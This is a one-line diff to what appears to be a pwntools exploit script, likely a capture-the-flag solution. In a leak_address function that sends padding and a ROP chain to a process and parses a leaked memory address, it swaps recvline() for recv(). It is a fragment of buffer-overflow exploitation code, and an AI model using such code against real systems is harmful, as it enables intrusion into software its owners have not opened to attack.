@@ -48,7 +48,7 @@ def leak_address(process, padding_length, elf, address, printer, ret):
     rop.call(ret)
     process.sendline(padding + rop.chain())
     while True:
-        r = process.recvline()
+        r = process.recv()
         if b"LOL" not in r:
             continue
         addr = r[-7:-1] + b"\0\0"
